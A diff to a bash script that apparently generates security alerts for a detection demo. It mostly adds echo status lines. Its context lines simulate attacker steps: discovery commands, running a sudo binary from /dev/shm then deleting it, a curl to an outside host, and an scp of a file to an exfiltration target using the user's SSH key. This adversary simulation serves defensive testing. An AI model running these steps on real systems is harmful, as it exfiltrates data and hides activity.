@@ -47,7 +47,8 @@ if [ "${#missing[@]}" -gt 0 ]; then
 fi
 
 # Generate some random noise for the Event Analyzer view
-printf "%s" "Who am I? $(/usr/bin/whoami)\n"
+/bin/echo "Generating some random noise for the Event Analyzer view"
+/usr/bin/whoami &>/dev/null
 /usr/bin/ls &>/dev/null
 
 # Trigger Account Discovery alerts
@@ -60,17 +61,21 @@ for i in {1..3}; do
 done
 
 # Copy C programs over and execute
+/bin/echo "Copying C programs over and executing"
 /usr/bin/cp -p $ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
 /usr/bin/tar xf /dev/shm/demo_progs.tar -C /dev/shm/ &>/dev/null
 sudo /dev/shm/nothing_to_see_here &>/dev/null
 
 # Trigger Inidcator Match Detection Rules
+/bin/echo "Triggering Indicator Match Detection Rules"
 /usr/bin/curl http://x.com/dlr.ppc &>/dev/null
 
 # Trigger Malware alert with EICAR file
+/bin/echo "Triggering Malware alert with EICAR file"
 /usr/bin/unzip $ROOTDIR/files/eicar_com.zip &>/dev/null
 
 # Trigger Linux system info discovery rule
+/bin/echo "Triggering Linux system info discovery rule"
 for i in {1..4}; do
   /usr/bin/uname -r &>/dev/null
   /usr/bin/uname -o &>/dev/null
@@ -82,6 +87,7 @@ for i in {1..4}; do
 done
 
 if [ -f "$FILE" ]; then
+  /bin/echo "Copying $FILE to $EXFILL_TARGET"
   /usr/bin/scp -i $HOMEDIR/.ssh/id_rsa $FILE $SSH_USER@$EXFILL_TARGET:~/  
 fi
 
@@ -89,6 +95,7 @@ fi
 # You can show this in the Event Analyzer, and then show the process still running
 # in memory with OSquery
 if [ $? -eq 0 ]; then
+  /bin/echo "Removing files from /dev/shm"
  /usr/bin/rm -f /dev/shm/{nothing_to_see_here,move_along,demo_progs.tar} &>/dev/null
 fi 
 
